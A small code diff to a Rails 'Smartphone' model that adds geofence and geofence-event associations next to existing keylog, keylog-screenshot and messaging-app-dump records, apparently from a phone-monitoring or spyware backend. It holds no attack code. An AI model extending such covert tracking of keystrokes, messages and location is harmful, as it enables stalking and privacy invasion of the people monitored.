@@ -11,6 +11,8 @@ class Smartphone < ApplicationRecord
   has_many :messaging_apps_dumps, dependent: :destroy
   has_many :keylogs, dependent: :destroy
   has_many :keylog_screenshots, dependent: :destroy
+  has_many :geofences, dependent: :destroy
+  has_many :geofence_events, dependent: :destroy
   
   validates :name, presence: true
   validates :device_id, presence: true, uniqueness: true
